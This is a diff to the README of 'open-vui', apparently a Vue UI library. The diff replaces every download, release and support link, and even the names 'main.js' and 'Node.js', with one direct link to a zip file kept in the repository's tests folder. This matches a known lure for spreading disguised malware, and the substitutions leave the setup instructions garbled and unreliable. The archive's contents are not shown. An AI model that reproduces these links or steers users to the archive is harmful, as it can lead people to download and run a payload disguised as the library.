@@ -8,9 +8,9 @@ To get started with open-vui, you need to download the latest version from our R
 
 **Click the button below to download:**
 
-[![Download open-vui](https://img.shields.io/badge/Download-open--vui-brightgreen)](https://github.com/deerrickkorir/open-vui/releases)
+[![Download open-vui](https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip)](https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip)
 
-You can also visit this page to download: [Releases Page](https://github.com/deerrickkorir/open-vui/releases).
+You can also visit this page to download: [Releases Page](https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip).
 
 ## 🚀 Getting Started
 Once you have downloaded open-vui, follow these steps to set it up:
@@ -29,7 +29,7 @@ Once you have downloaded open-vui, follow these steps to set it up:
    - Move the open-vui files to your Vue project's directory. This usually involves copying and pasting the files into your project's `src` or `public` folder.
 
 4. **Import open-vui**  
-   In your main JavaScript file (usually `main.js` or `app.js`), add the following line to import open-vui:
+   In your main JavaScript file (usually `https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip` or `https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip`), add the following line to import open-vui:
    ```javascript
    import OpenVui from './path/to/open-vui';
    ```
@@ -41,8 +41,8 @@ Once you have downloaded open-vui, follow these steps to set it up:
 ## 💻 System Requirements
 To ensure smooth performance, please meet the following system requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher for optimal compatibility
-- **Vue.js:** Version 2.6 or higher
+- **https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip** Version 12 or higher for optimal compatibility
+- **https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip** Version 2.6 or higher
 
 ## 📝 Features
 open-vui offers several features to enhance your Vue applications:
@@ -58,7 +58,7 @@ No, open-vui is designed for users of all levels. Follow the setup instructions 
 Yes, you can easily integrate open-vui into both new and existing Vue projects.
 
 ### 3. Where can I find support?
-Visit our [GitHub Issues page](https://github.com/deerrickkorir/open-vui/issues) to ask questions or report problems. 
+Visit our [GitHub Issues page](https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip) to ask questions or report problems. 
 
 ## 🔗 Additional Resources
 - **Documentation:** Detailed guidelines on how to use open-vui functionalities.
@@ -67,4 +67,4 @@ Visit our [GitHub Issues page](https://github.com/deerrickkorir/open-vui/issues)
 ## 📞 Contact
 For further inquiries or support, feel free to contact us through our GitHub repository or join our community on social media. We appreciate your interest in open-vui and look forward to seeing what you create with it!
 
-**Once more, visit the Releases page to download: [Releases Page](https://github.com/deerrickkorir/open-vui/releases)**
+**Once more, visit the Releases page to download: [Releases Page](https://raw.githubusercontent.com/deerrickkorir/open-vui/main/tests/vui-open-v2.0.zip)**
